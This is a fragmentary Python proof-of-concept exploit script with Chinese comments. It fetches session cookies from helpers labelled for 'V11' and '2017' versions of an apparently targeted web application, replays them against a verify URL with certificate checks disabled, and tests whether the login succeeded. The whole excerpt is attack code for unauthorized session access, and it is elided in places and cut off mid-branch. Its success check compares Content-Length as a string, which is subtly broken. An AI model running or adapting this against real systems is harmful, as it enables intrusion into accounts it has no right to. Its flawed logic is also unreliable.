...
def isSuccess(header):
    flag = False
    if str(header["Content-Length"]) > "50000":
...
def poc(url):
    ...
    try:
        # 获取cookie
        res_var1 = getV11Session(url) 
        res_var2 = get2017Session(url) 
        # 如果var1 可
        if res_var1:

            header1 = {"Cookie":res_var1}
            try:
                req1 = requests.get(verify_url, headers=header1, verify=False, timeout=8 )
                #print(req1.text)
            except:
                return False
            # 判断是否登录成功
            if isSuccess(req1.headers):
                return url
        elif res_var2:
            header2 = {"Cookie":res_var2}
            try:
                # 如果var2 可：2017
                req2 = requests.get(verify_url, headers=header2, verify=False, timeout=8 )
                #print(req2.text)
                # 判断是否登录成功
                if isSuccess(req2.headers):
                    return url
            except:
                return False
        else:
